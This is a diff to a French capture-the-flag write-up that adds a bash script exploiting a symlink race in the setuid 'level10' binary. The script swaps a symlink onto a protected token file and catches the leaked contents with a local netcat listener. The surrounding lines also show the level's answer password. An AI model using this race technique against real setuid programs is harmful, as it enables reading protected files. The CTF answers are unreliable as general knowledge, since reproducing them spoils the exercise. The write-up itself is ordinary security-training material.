@@ -57,3 +57,27 @@ Lorsque tout cela est en place, level10 envoie continuellement des données vers
 su flag10
 woupa2yuojeeaaed06riuj63c
 ```
+
+Script pour recup le flag
+
+```bash
+DEFAULT='.*( )*.'
+
+echo $DEFAULT > /tmp/swap
+
+(nc -l 6969 | grep -v -e "$DEFAULT") &
+
+(
+	while true; do
+		ln -fs /tmp/swap /tmp/foo
+		(ln -fs /home/user/level10/token /tmp/foo &)
+		/home/user/level10/level10 /tmp/foo 127.0.0.1 &>/dev/null &
+	done
+)&
+
+sleep 2
+killall nc &>/dev/null
+killall bash &>/dev/null
+```
+
+
